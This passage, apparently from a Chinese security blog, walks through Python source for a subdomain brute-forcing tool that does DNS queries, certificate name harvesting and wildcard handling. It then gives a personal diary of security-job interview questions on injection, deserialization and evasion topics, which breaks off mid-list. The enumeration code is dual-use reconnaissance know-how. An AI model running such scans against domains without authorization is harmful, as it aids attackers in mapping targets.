class=\"line\">    <span class=\"keyword\">async</span> <span class=\"keyword\">def</span> <span class=\"title function_\">load_sub_names</span>(<span class=\"params\">self</span>):</span><br><span class=\"line\">        normal_lines = []</span><br><span class=\"line\">        wildcard_lines = []</span><br><span class=\"line\">        wildcard_set = <span class=\"built_in\">set</span>()</span><br><span class=\"line\">        regex_list = []</span><br><span class=\"line\">        lines = <span class=\"built_in\">set</span>()</span><br><span class=\"line\">        <span class=\"comment\"># 打开文件逐行读取子域名，跳过空行或重复子域名</span></span><br><span class=\"line\">        <span class=\"keyword\">with</span> <span class=\"built_in\">open</span>(<span class=\"variable language_\">self</span>.options.file) <span class=\"keyword\">as</span> inFile:</span><br><span class=\"line\">            <span class=\"keyword\">for</span> line <span class=\"keyword\">in</span> inFile.readlines():</span><br><span class=\"line\">                sub = line.strip()</span><br><span class=\"line\">                <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> sub <span class=\"keyword\">or</span> sub <span class=\"keyword\">in</span> lines:</span><br><span class=\"line\">                    <span class=\"keyword\">continue</span></span><br><span class=\"line\">                lines.add(sub)</span><br><span class=\"line\"></span><br><span class=\"line\">                <span class=\"comment\"># 判断子域名是否含占位符</span></span><br><span class=\"line\">                brace_count = sub.count(<span class=\"string\">&#x27;&#123;&#x27;</span>)</span><br><span class=\"line\">                <span class=\"keyword\">if</span> brace_count &gt; <span class=\"number\">0</span>:</span><br><span class=\"line\">                    wildcard_lines.append((brace_count, sub))</span><br><span class=\"line\">\t\t\t\t\t<span class=\"comment\"># 占位符处理</span></span><br><span class=\"line\">                    sub = sub.replace(<span class=\"string\">&#x27;&#123;alphnum&#125;&#x27;</span>, <span class=\"string\">&#x27;[a-z0-9]&#x27;</span>)</span><br><span class=\"line\">                    sub = sub.replace(<span class=\"string\">&#x27;&#123;alpha&#125;&#x27;</span>, <span class=\"string\">&#x27;[a-z]&#x27;</span>)</span><br><span class=\"line\">                    sub = sub.replace(<span class=\"string\">&#x27;&#123;num&#125;&#x27;</span>, <span class=\"string\">&#x27;[0-9]&#x27;</span>)</span><br><span class=\"line\">                    <span class=\"comment\"># 去重</span></span><br><span class=\"line\">                    <span class=\"keyword\">if</span> sub <span class=\"keyword\">not</span> <span class=\"keyword\">in</span> wildcard_set:</span><br><span class=\"line\">                        wildcard_set.add(sub)</span><br><span class=\"line\">                        regex_list.append(<span class=\"string\">&#x27;^&#x27;</span> + sub + <span class=\"string\">&#x27;$&#x27;</span>)</span><br><span class=\"line\">                <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                    <span class=\"comment\"># 普通子域名直接加入列表</span></span><br><span class=\"line\">                    normal_lines.append(sub)</span><br><span class=\"line\">                    <span class=\"variable language_\">self</span>.normal_names_set.add(sub)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> regex_list:</span><br><span class=\"line\">            pattern = <span class=\"string\">&#x27;|&#x27;</span>.join(regex_list)</span><br><span class=\"line\">            _regex = re.<span class=\"built_in\">compile</span>(pattern)</span><br><span class=\"line\">            <span class=\"keyword\">for</span> line <span class=\"keyword\">in</span> normal_lines:</span><br><span class=\"line\">                <span class=\"keyword\">if</span> _regex.search(line):</span><br><span class=\"line\">                    normal_lines.remove(line)</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">        <span class=\"comment\"># 普通子域名加入队列，优先级为0</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> _ <span class=\"keyword\">in</span> normal_lines[<span class=\"variable language_\">self</span>.process_num::<span class=\"variable language_\">self</span>.options.process]:</span><br><span class=\"line\">            <span class=\"keyword\">await</span> <span class=\"variable language_\">self</span>.queue.put((<span class=\"number\">0</span>, _))    <span class=\"comment\"># priority set to 0</span></span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"comment\"># 含占位符的子域名直接加入队列</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> _ <span class=\"keyword\">in</span> wildcard_lines[<span class=\"variable language_\">self</span>.process_num::<span class=\"variable language_\">self</span>.options.process]:</span><br><span class=\"line\">            <span class=\"keyword\">await</span> <span class=\"variable language_\">self</span>.queue.put(_)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># 检测进程状态</span></span><br><span class=\"line\">    <span class=\"keyword\">async</span> <span class=\"keyword\">def</span> <span class=\"title function_\">update_counter</span>(<span class=\"params\">self</span>):</span><br><span class=\"line\">        <span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">            <span class=\"keyword\">if</span> <span class=\"string\">&#x27;1&#x27;</span> <span class=\"keyword\">not</span> <span class=\"keyword\">in</span> <span class=\"variable language_\">self</span>.threads_status:</span><br><span class=\"line\">                <span class=\"keyword\">return</span></span><br><span class=\"line\">            <span class=\"variable language_\">self</span>.scan_count.value += <span class=\"variable language_\">self</span>.scan_count_local</span><br><span class=\"line\">            <span class=\"variable language_\">self</span>.scan_count_local = <span class=\"number\">0</span></span><br><span class=\"line\">            <span class=\"variable language_\">self</span>.queue_size_array[<span class=\"variable language_\">self</span>.process_num] = <span class=\"variable language_\">self</span>.queue.qsize()</span><br><span class=\"line\">            <span class=\"keyword\">if</span> <span class=\"variable language_\">self</span>.found_count_local:</span><br><span class=\"line\">                <span class=\"variable language_\">self</span>.found_count.value += <span class=\"variable language_\">self</span>.found_count_local</span><br><span class=\"line\">                <span class=\"variable language_\">self</span>.found_count_local = <span class=\"number\">0</span></span><br><span class=\"line\">            <span class=\"variable language_\">self</span>.count_time = time.time()</span><br><span class=\"line\">            <span class=\"keyword\">await</span> asyncio.sleep(<span class=\"number\">0.5</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># 检测目标域名的SSL/TLS证书的扩展信息，提取符合条件的子域名</span></span><br><span class=\"line\">    <span class=\"keyword\">async</span> <span class=\"keyword\">def</span> <span class=\"title function_\">check_https_alt_names</span>(<span class=\"params\">self, domain</span>):</span><br><span class=\"line\">        <span class=\"keyword\">try</span>:</span><br><span class=\"line\">            <span class=\"comment\"># 建立异步HTTPS连接</span></span><br><span class=\"line\">            reader, _ = <span class=\"keyword\">await</span> asyncio.open_connection(</span><br><span class=\"line\">                host=domain,</span><br><span class=\"line\">                port=<span class=\"number\">443</span>,</span><br><span class=\"line\">                ssl=<span class=\"literal\">True</span>,</span><br><span class=\"line\">                server_hostname=domain,</span><br><span class=\"line\">            )</span><br><span class=\"line\">            <span class=\"comment\"># 获取证书详细信息</span></span><br><span class=\"line\">            <span class=\"keyword\">for</span> item <span class=\"keyword\">in</span> reader._transport.get_extra_info(<span class=\"string\">&#x27;peercert&#x27;</span>)[<span class=\"string\">&#x27;subjectAltName&#x27;</span>]:</span><br><span class=\"line\">                <span class=\"keyword\">if</span> item[<span class=\"number\">0</span>].upper() == <span class=\"string\">&#x27;DNS&#x27;</span>:</span><br><span class=\"line\">                    name = item[<span class=\"number\">1</span>].lower()</span><br><span class=\"line\">                    <span class=\"comment\"># 筛选符合条件的子域名</span></span><br><span class=\"line\">                    <span class=\"keyword\">if</span> name.endswith(<span class=\"variable language_\">self</span>.domain):</span><br><span class=\"line\">                        sub = name[:<span class=\"built_in\">len</span>(name) - <span class=\"built_in\">len</span>(<span class=\"variable language_\">self</span>.domain) - <span class=\"number\">1</span>]    <span class=\"comment\"># new sub</span></span><br><span class=\"line\">                        sub = sub.replace(<span class=\"string\">&#x27;*&#x27;</span>, <span class=\"string\">&#x27;&#x27;</span>)</span><br><span class=\"line\">                        sub = sub.strip(<span class=\"string\">&#x27;.&#x27;</span>)</span><br><span class=\"line\">                        <span class=\"comment\"># 去重并添加到任务队列</span></span><br><span class=\"line\">                        <span class=\"keyword\">if</span> sub <span class=\"keyword\">and</span> sub <span class=\"keyword\">not</span> <span class=\"keyword\">in</span> <span class=\"variable language_\">self</span>.found_subs <span class=\"keyword\">and</span> \\</span><br><span class=\"line\">                                sub <span class=\"keyword\">not</span> <span class=\"keyword\">in</span> <span class=\"variable language_\">self</span>.normal_names_set <span class=\"keyword\">and</span> sub <span class=\"keyword\">not</span> <span class=\"keyword\">in</span> <span class=\"variable language_\">self</span>.cert_subs:</span><br><span class=\"line\">                            <span class=\"variable language_\">self</span>.cert_subs.add(sub)</span><br><span class=\"line\">                            <span class=\"keyword\">await</span> <span class=\"variable language_\">self</span>.queue.put((<span class=\"number\">0</span>, sub))</span><br><span class=\"line\">        <span class=\"keyword\">except</span> Exception <span class=\"keyword\">as</span> e:</span><br><span class=\"line\">            <span class=\"keyword\">pass</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># 查询DNS解析结果，并限制查询的超时时间</span></span><br><span class=\"line\">    <span class=\"keyword\">async</span> <span class=\"keyword\">def</span> <span class=\"title function_\">do_query</span>(<span class=\"params\">self, j, cur_domain</span>):</span><br><span class=\"line\">        <span class=\"keyword\">async</span> <span class=\"keyword\">with</span> timeout(<span class=\"number\">10.2</span>):</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"keyword\">await</span> <span class=\"variable language_\">self</span>.resolvers[j].resolve(cur_domain, <span class=\"string\">&#x27;A&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># 扫描</span></span><br><span class=\"line\">    <span class=\"keyword\">async</span> <span class=\"keyword\">def</span> <span class=\"title function_\">scan</span>(<span class=\"params\">self, j</span>):</span><br><span class=\"line\">        <span class=\"comment\"># 设置DNS解析器</span></span><br><span class=\"line\">        <span class=\"variable language_\">self</span>.resolvers[j].nameservers = [<span class=\"variable language_\">self</span>.dns_servers[j % <span class=\"variable language_\">self</span>.dns_count]]</span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"variable language_\">self</span>.dns_count &gt; <span class=\"number\">1</span>:</span><br><span class=\"line\">            <span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">                s = random.choice(<span class=\"variable language_\">self</span>.dns_servers)</span><br><span class=\"line\">                <span class=\"keyword\">if</span> s != <span class=\"variable language_\">self</span>.dns_servers[j % <span class=\"variable language_\">self</span>.dns_count]:</span><br><span class=\"line\">                    <span class=\"variable language_\">self</span>.resolvers[j].nameservers.append(s)</span><br><span class=\"line\">                    <span class=\"keyword\">break</span></span><br><span class=\"line\">        empty_counter = <span class=\"number\">0</span></span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"comment\"># 处理子域</span></span><br><span class=\"line\">        <span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">            <span class=\"keyword\">try</span>:</span><br><span class=\"line\">                brace_count, sub = <span class=\"variable language_\">self</span>.queue.get_nowait()</span><br><span class=\"line\">                <span class=\"variable language_\">self</span>.threads_status[j] = <span class=\"string\">&#x27;1&#x27;</span></span><br><span class=\"line\">                empty_counter = <span class=\"number\">0</span></span><br><span class=\"line\">            <span class=\"keyword\">except</span> asyncio.queues.QueueEmpty <span class=\"keyword\">as</span> e:</span><br><span class=\"line\">                empty_counter += <span class=\"number\">1</span></span><br><span class=\"line\">                <span class=\"keyword\">if</span> empty_counter &gt; <span class=\"number\">10</span>:</span><br><span class=\"line\">                    <span class=\"variable language_\">self</span>.threads_status[j] = <span class=\"string\">&#x27;0&#x27;</span></span><br><span class=\"line\">                <span class=\"keyword\">if</span> <span class=\"string\">&#x27;1&#x27;</span> <span class=\"keyword\">not</span> <span class=\"keyword\">in</span> <span class=\"variable language_\">self</span>.threads_status:</span><br><span class=\"line\">                    <span class=\"keyword\">break</span></span><br><span class=\"line\">                <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                    <span class=\"keyword\">await</span> asyncio.sleep(<span class=\"number\">0.1</span>)</span><br><span class=\"line\">                    <span class=\"keyword\">continue</span></span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"comment\"># 对于带有通配符的子域进行处理</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> brace_count &gt; <span class=\"number\">0</span>:</span><br><span class=\"line\">                brace_count -= <span class=\"number\">1</span></span><br><span class=\"line\">                <span class=\"keyword\">if</span> sub.find(<span class=\"string\">&#x27;&#123;next_sub&#125;&#x27;</span>) &gt;= <span class=\"number\">0</span>:</span><br><span class=\"line\">                    <span class=\"keyword\">for</span> _ <span class=\"keyword\">in</span> <span class=\"variable language_\">self</span>.next_subs:</span><br><span class=\"line\">                        <span class=\"keyword\">await</span> <span class=\"variable language_\">self</span>.queue.put((<span class=\"number\">0</span>, sub.replace(<span class=\"string\">&#x27;&#123;next_sub&#125;&#x27;</span>, _)))</span><br><span class=\"line\">                <span class=\"keyword\">if</span> sub.find(<span class=\"string\">&#x27;&#123;alphnum&#125;&#x27;</span>) &gt;= <span class=\"number\">0</span>:</span><br><span class=\"line\">                    <span class=\"keyword\">for</span> _ <span class=\"keyword\">in</span> <span class=\"string\">&#x27;abcdefghijklmnopqrstuvwxyz0123456789&#x27;</span>:</span><br><span class=\"line\">                        <span class=\"keyword\">await</span> <span class=\"variable language_\">self</span>.queue.put((brace_count, sub.replace(<span class=\"string\">&#x27;&#123;alphnum&#125;&#x27;</span>, _, <span class=\"number\">1</span>)))</span><br><span class=\"line\">                <span class=\"keyword\">elif</span> sub.find(<span class=\"string\">&#x27;&#123;alpha&#125;&#x27;</span>) &gt;= <span class=\"number\">0</span>:</span><br><span class=\"line\">                    <span class=\"keyword\">for</span> _ <span class=\"keyword\">in</span> <span class=\"string\">&#x27;abcdefghijklmnopqrstuvwxyz&#x27;</span>:</span><br><span class=\"line\">                        <span class=\"keyword\">await</span> <span class=\"variable language_\">self</span>.queue.put((brace_count, sub.replace(<span class=\"string\">&#x27;&#123;alpha&#125;&#x27;</span>, _, <span class=\"number\">1</span>)))</span><br><span class=\"line\">                <span class=\"keyword\">elif</span> sub.find(<span class=\"string\">&#x27;&#123;num&#125;&#x27;</span>) &gt;= <span class=\"number\">0</span>:</span><br><span class=\"line\">                    <span class=\"keyword\">for</span> _ <span class=\"keyword\">in</span> <span class=\"string\">&#x27;0123456789&#x27;</span>:</span><br><span class=\"line\">                        <span class=\"keyword\">await</span> <span class=\"variable language_\">self</span>.queue.put((brace_count, sub.replace(<span class=\"string\">&#x27;&#123;num&#125;&#x27;</span>, _, <span class=\"number\">1</span>)))</span><br><span class=\"line\">                <span class=\"keyword\">continue</span></span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">try</span>:</span><br><span class=\"line\">                <span class=\"keyword\">if</span> sub <span class=\"keyword\">in</span> <span class=\"variable language_\">self</span>.found_subs:</span><br><span class=\"line\">                    <span class=\"keyword\">continue</span></span><br><span class=\"line\"></span><br><span class=\"line\">                <span class=\"variable language_\">self</span>.scan_count_local += <span class=\"number\">1</span></span><br><span class=\"line\">                cur_domain = sub + <span class=\"string\">&#x27;.&#x27;</span> + <span class=\"variable language_\">self</span>.domain</span><br><span class=\"line\"></span><br><span class=\"line\">                <span class=\"comment\"># 执行DNS查询</span></span><br><span class=\"line\">                answers = <span class=\"keyword\">await</span> <span class=\"variable language_\">self</span>.do_query(j, cur_domain)</span><br><span class=\"line\">                </span><br><span class=\"line\">                <span class=\"comment\"># 处理DNS查询结果，排除无效IP</span></span><br><span class=\"line\">                <span class=\"keyword\">if</span> answers:</span><br><span class=\"line\">                    <span class=\"variable language_\">self</span>.found_subs.add(sub)</span><br><span class=\"line\">                    ips = <span class=\"string\">&#x27;, &#x27;</span>.join(<span class=\"built_in\">sorted</span>([answer.address <span class=\"keyword\">for</span> answer <span class=\"keyword\">in</span> answers]))</span><br><span class=\"line\">                    invalid_ip_found = <span class=\"literal\">False</span></span><br><span class=\"line\">                    <span class=\"keyword\">for</span> answer <span class=\"keyword\">in</span> answers:</span><br><span class=\"line\">                        <span class=\"keyword\">if</span> answer.address <span class=\"keyword\">in</span> [<span class=\"string\">&#x27;1.1.1.1&#x27;</span>, <span class=\"string\">&#x27;127.0.0.1&#x27;</span>, <span class=\"string\">&#x27;0.0.0.0&#x27;</span>, <span class=\"string\">&#x27;0.0.0.1&#x27;</span>]:</span><br><span class=\"line\">                            invalid_ip_found = <span class=\"literal\">True</span></span><br><span class=\"line\">                    <span class=\"keyword\">if</span> invalid_ip_found:</span><br><span class=\"line\">                        <span class=\"keyword\">continue</span></span><br><span class=\"line\">                    <span class=\"keyword\">if</span> <span class=\"variable language_\">self</span>.options.i <span class=\"keyword\">and</span> is_intranet(answers[<span class=\"number\">0</span>].host):</span><br><span class=\"line\">                        <span class=\"keyword\">continue</span></span><br><span class=\"line\"></span><br><span class=\"line\">                    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">                        <span class=\"comment\"># 查询CNAME记录</span></span><br><span class=\"line\">                        cname = <span class=\"built_in\">str</span>(answers.canonical_name)[:-<span class=\"number\">1</span>]</span><br><span class=\"line\">                        <span class=\"keyword\">if</span> cname != cur_domain <span class=\"keyword\">and</span> cname.endswith(<span class=\"variable language_\">self</span>.domain):</span><br><span class=\"line\">                            cname_sub = cname[:<span class=\"built_in\">len</span>(cname) - <span class=\"built_in\">len</span>(<span class=\"variable language_\">self</span>.domain) - <span class=\"number\">1</span>]    <span class=\"comment\"># new sub</span></span><br><span class=\"line\">                            <span class=\"keyword\">if</span> cname_sub <span class=\"keyword\">not</span> <span class=\"keyword\">in</span> <span class=\"variable language_\">self</span>.found_subs <span class=\"keyword\">and</span> cname_sub <span class=\"keyword\">not</span> <span class=\"keyword\">in</span> <span class=\"variable language_\">self</span>.normal_names_set:</span><br><span class=\"line\">                                <span class=\"keyword\">await</span> <span class=\"variable language_\">self</span>.queue.put((<span class=\"number\">0</span>, cname_sub))</span><br><span class=\"line\">                    <span class=\"keyword\">except</span> Exception <span class=\"keyword\">as</span> e:</span><br><span class=\"line\">                        <span class=\"keyword\">pass</span></span><br><span class=\"line\"></span><br><span class=\"line\">                    first_level_sub = sub.split(<span class=\"string\">&#x27;.&#x27;</span>)[-<span class=\"number\">1</span>]</span><br><span class=\"line\">                    max_found = <span class=\"number\">20</span></span><br><span class=\"line\"></span><br><span class=\"line\">                    <span class=\"keyword\">if</span> <span class=\"variable language_\">self</span>.options.w:</span><br><span class=\"line\">                        first_level_sub = <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\">                        max_found = <span class=\"number\">3</span></span><br><span class=\"line\"></span><br><span class=\"line\">                    <span class=\"keyword\">if</span> (first_level_sub, ips) <span class=\"keyword\">not</span> <span class=\"keyword\">in</span> <span class=\"variable language_\">self</span>.ip_dict:</span><br><span class=\"line\">                        <span class=\"variable language_\">self</span>.ip_dict[(first_level_sub, ips)] = <span class=\"number\">1</span></span><br><span class=\"line\">                    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                        <span class=\"variable language_\">self</span>.ip_dict[(first_level_sub, ips)] += <span class=\"number\">1</span></span><br><span class=\"line\">                        <span class=\"keyword\">if</span> <span class=\"variable language_\">self</span>.ip_dict[(first_level_sub, ips)] &gt; max_found:</span><br><span class=\"line\">                            <span class=\"keyword\">continue</span></span><br><span class=\"line\"></span><br><span class=\"line\">                    <span class=\"variable language_\">self</span>.found_count_local += <span class=\"number\">1</span></span><br><span class=\"line\"></span><br><span class=\"line\">                    <span class=\"comment\"># 将查询结果写入文件</span></span><br><span class=\"line\">                    <span class=\"variable language_\">self</span>.outfile.write(cur_domain.ljust(<span class=\"number\">30</span>) + <span class=\"string\">&#x27;\\t&#x27;</span> + ips + <span class=\"string\">&#x27;\\n&#x27;</span>)</span><br><span class=\"line\">                    <span class=\"variable language_\">self</span>.outfile.flush()</span><br><span class=\"line\"></span><br><span class=\"line\">                    <span class=\"comment\"># 检查HTTPS证书</span></span><br><span class=\"line\">                    <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> <span class=\"variable language_\">self</span>.options.no_cert_check:</span><br><span class=\"line\">                        <span class=\"keyword\">async</span> <span class=\"keyword\">with</span> timeout(<span class=\"number\">10.0</span>):</span><br><span class=\"line\">                            <span class=\"keyword\">await</span> <span class=\"variable language_\">self</span>.check_https_alt_names(cur_domain)</span><br><span class=\"line\"></span><br><span class=\"line\">                    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">                        <span class=\"variable language_\">self</span>.scan_count_local += <span class=\"number\">1</span></span><br><span class=\"line\">                        <span class=\"keyword\">await</span> <span class=\"variable language_\">self</span>.do_query(j, <span class=\"string\">&#x27;lijiejie-test-not-existed.&#x27;</span> + cur_domain)</span><br><span class=\"line\"></span><br><span class=\"line\">                    <span class=\"keyword\">except</span> dns.resolver.NXDOMAIN <span class=\"keyword\">as</span> e:</span><br><span class=\"line\">                        <span class=\"keyword\">if</span> <span class=\"variable language_\">self</span>.queue.qsize() &lt; <span class=\"number\">20000</span>:</span><br><span class=\"line\">                            <span class=\"keyword\">for</span> _ <span class=\"keyword\">in</span> <span class=\"variable language_\">self</span>.next_subs:</span><br><span class=\"line\">                                <span class=\"keyword\">await</span> <span class=\"variable language_\">self</span>.queue.put((<span class=\"number\">0</span>, _ + <span class=\"string\">&#x27;.&#x27;</span> + sub))</span><br><span class=\"line\">                        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                            <span class=\"keyword\">await</span> <span class=\"variable language_\">self</span>.queue.put((<span class=\"number\">1</span>, <span class=\"string\">&#x27;&#123;next_sub&#125;.&#x27;</span> + sub))</span><br><span class=\"line\">                    <span class=\"keyword\">except</span> Exception <span class=\"keyword\">as</span> e:</span><br><span class=\"line\">                        <span class=\"keyword\">continue</span></span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">except</span> (dns.resolver.NXDOMAIN, dns.resolver.NoAnswer) <span class=\"keyword\">as</span> e:</span><br><span class=\"line\">                <span class=\"keyword\">pass</span></span><br><span class=\"line\">            <span class=\"keyword\">except</span> dns.resolver.NoNameservers <span class=\"keyword\">as</span> e:</span><br><span class=\"line\">                <span class=\"variable language_\">self</span>.no_server_subs[sub] = <span class=\"variable language_\">self</span>.no_server_subs.get(sub, <span class=\"number\">0</span>) + <span class=\"number\">1</span></span><br><span class=\"line\">                <span class=\"keyword\">if</span> <span class=\"variable language_\">self</span>.no_server_subs[sub] &lt;= <span class=\"number\">3</span>:</span><br><span class=\"line\">                    <span class=\"keyword\">await</span> <span class=\"variable language_\">self</span>.queue.put((<span class=\"number\">0</span>, sub))    <span class=\"comment\"># Retry again</span></span><br><span class=\"line\">            <span class=\"keyword\">except</span> (dns.exception.Timeout, dns.resolver.LifetimeTimeout) <span class=\"keyword\">as</span> e:</span><br><span class=\"line\">                <span class=\"variable language_\">self</span>.timeout_subs[sub] = <span class=\"variable language_\">self</span>.timeout_subs.get(sub, <span class=\"number\">0</span>) + <span class=\"number\">1</span></span><br><span class=\"line\">                <span class=\"keyword\">if</span> <span class=\"variable language_\">self</span>.timeout_subs[sub] &lt;= <span class=\"number\">3</span>:</span><br><span class=\"line\">                    <span class=\"keyword\">await</span> <span class=\"variable language_\">self</span>.queue.put((<span class=\"number\">0</span>, sub))    <span class=\"comment\"># Retry again</span></span><br><span class=\"line\">            <span class=\"keyword\">except</span> Exception <span class=\"keyword\">as</span> e:</span><br><span class=\"line\">                <span class=\"keyword\">if</span> <span class=\"built_in\">str</span>(<span class=\"built_in\">type</span>(e)).find(<span class=\"string\">&#x27;asyncio.exceptions.TimeoutError&#x27;</span>) &lt; <span class=\"number\">0</span>:</span><br><span class=\"line\">                    <span class=\"keyword\">with</span> <span class=\"built_in\">open</span>(<span class=\"string\">&#x27;errors.log&#x27;</span>, <span class=\"string\">&#x27;a&#x27;</span>) <span class=\"keyword\">as</span> errFile:</span><br><span class=\"line\">                        errFile.write(<span class=\"string\">&#x27;[%s] %s\\n&#x27;</span> % (<span class=\"built_in\">type</span>(e), <span class=\"built_in\">str</span>(e)))</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">async</span> <span class=\"keyword\">def</span> <span class=\"title function_\">async_run</span>(<span class=\"params\">self</span>):</span><br><span class=\"line\">        <span class=\"keyword\">await</span> <span class=\"variable language_\">self</span>.load_sub_names()</span><br><span class=\"line\">        tasks = [<span class=\"variable language_\">self</span>.scan(i) <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"variable language_\">self</span>.options.threads)]</span><br><span class=\"line\">        tasks.insert(<span class=\"number\">0</span>, <span class=\"variable language_\">self</span>.update_counter())</span><br><span class=\"line\">        <span class=\"keyword\">await</span> asyncio.gather(*tasks)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">run</span>(<span class=\"params\">self</span>):</span><br><span class=\"line\">        loop = asyncio.get_event_loop()</span><br><span class=\"line\">        asyncio.set_event_loop(loop)</span><br><span class=\"line\">        loop.run_until_complete(<span class=\"variable language_\">self</span>.async_run())</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">run_process</span>(<span class=\"params\">*params</span>):</span><br><span class=\"line\">    <span class=\"comment\"># 信号处理器</span></span><br><span class=\"line\">    signal.signal(signal.SIGINT, user_abort)</span><br><span class=\"line\">    <span class=\"comment\"># 调用SubNameBrute的run方法</span></span><br><span class=\"line\">    s = SubNameBrute(*params)</span><br><span class=\"line\">    s.run()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 根据option.process启动多个进程</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> process_num <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(options.process):</span><br><span class=\"line\">    p = multiprocessing.Process(</span><br><span class=\"line\">        <span class=\"comment\"># 调用run_process进行扫描</span></span><br><span class=\"line\">        target=run_process,</span><br><span class=\"line\">        args=(domain, options, process_num, dns_servers, next_subs,</span><br><span class=\"line\">              scan_count, found_count, queue_size_array, tmp_dir)</span><br><span class=\"line\">    )</span><br><span class=\"line\">    all_process.append(p)</span><br><span class=\"line\">    p.start()</span><br></pre></td></tr></table></figure>\n\n<p>总体的工作路径为：</p>\n<ul>\n<li><strong>加载子域名</strong>：从文件中读取子域名，识别通配符，放入任务队列</li>\n<li>扫描子域<ul>\n<li>多线程扫描子域</li>\n<li>对每个子域执行DNS查询，处理返回结果</li>\n<li>对子域名进行证书检查，CNAME解析等附加操作</li>\n</ul>\n</li>\n<li><strong>记录结果</strong></li>\n<li><strong>错误处理与重试</strong>：对于DNS查询失败的子域进行重试，最多三次</li>\n</ul>\n<p>这里有个证书检查和CNAME解析，还有一个称呼叫<strong>证书透明度</strong>主要原因是<strong>提高全面性</strong>。在<strong>SSL&#x2F;TLS</strong>证书中的<code>subjectAltName</code>字段会暴露一些隐藏子域。<strong>CNAME</strong>是DNS中的一种记录类别，通常用于将一个域名指向另一个域名，也就是说CNAME可以为某个域名创建一个别名，因此可以去发现隐藏的域名，增加子域名查询的全面性。</p>\n<p><strong>对于通配符子域名的处理</strong>：讲这些子域存在一个集合中，避免重复爆破，根据查询CNAME和MX记录，挖掘更多的子域，并且进行递归查询。</p>\n"},{"title":"找工作之旅","hide":false,"abbrlink":13584,"date":"2025-03-03T15:26:55.000Z","_content":"\n## 2024-3-27\n\n### 长亭一面\n\n- 自我介绍\n- 了解常见的漏洞吗\n  - SQL注入啊，SSRF啊什么什么的讲了一通\n- SQL注入无回显的情况下怎么利用呢\n  - 讲了下盲注\n- 了解twos的一些漏洞吗\n  - 没听清，我一直读的唉唉艾斯（IIS）\n- 那你了解weblogic的一些漏洞吗\n  - 说了反序列化\n- 你做过web项目开发，讲讲\n  - 说了用springboot开发\n- 那你知道springboot的一些漏洞吗\n  - 说了个Framework反序列化漏洞，还有个Actuator泄露\n- Actuator泄露能展开讲讲吗\n  - 大概讲了下泄露了什么，怎么利用\n- 了解Java相关漏洞吗\n  - 说了shiro反序列化漏洞，说了下原理\n- 会追CC链吗\n  - 讲了CC3和一个CB链\n- 了解内存马吗\n  - 大致讲了下原理\n- 反问\n  - 公司做什么（大致就是有师傅带着进行一些攻防，渗透测试）\n  - twos是什么（面试官讲了以后才知道就是IIS）\n\n长亭的效率是真的快，半小时就发二面通知了\n\n## 2023-3-29\n\n### 长亭二面\n\n- 自我介绍\n- 什么时间开始接触信息安全\n- 通过什么途径学习\n- 参加过哪些比赛，比较有名的\n- cert成员主要做什么\n- 测试对象\n- sql注入类型\n  - 盲注，堆叠啥的讲了一通\n- 特殊的注入\n  - 二次注入，宽字节注入\n- 你sql注入的一般流程\n  - 找注入点，fuzz过滤什么什么的。。。\n- 会用工具协助吗\n  - sqlmap\n- 浏览器输入域名到浏览器有一个回显，说一下这个过程是怎么实现的\n  - 按理解讲了一下，不知道对不对\n- sqlmap怎么对cookie进行注入\n  - 不会。。\n- 用过msf吗\n  - 讲了下对生成木马做源码级免杀，讲了一下原理\n- xss攻击原理\n  - 讲了一通\n- 怎么防御\n  - 黑白名单，输出编码，httponly\n- tcp三次握手\n- 大概意思是学习到哪了，只会web吗？\n  - 讲了下内网渗透\n- 性格咋样\n- 对网络安全的兴趣\n- 每天花多少学习网络安全\n- 护网了解吗\n- 网络安全其他分支进行过学习吗\n- 挖过src吗\n- 实战挖到过漏洞吗，讲下渗透测试经历\n  - 讲了一下博彩网站渗透\n- 印象深刻的一次ctf比赛\n  - 讲了一下天枢的一个题\n- 希望通过实习获得哪方面的提升\n- 反问\n  - 评价\n  - 工作模式和氛围\n- 后面紧接着就是hr面\n\n## 2024-4-2\n\n长亭oc\n\n## 2024-11-19\n\n### 腾讯一面\n\nlc4t学长的部门\n\n- 自我介绍\n- 介绍渗透测试思路\n- 指纹识别框架包含什么\n  - 关注哪些细节\n  - 识别工具原理\n- 常见备份文件或敏感目录以及用来做什么\n  - 自己的小技巧\n- 其他信息收集需要关注的信息和资产\n- 详细介绍蜜罐做的哪部分环节和工作\n  - 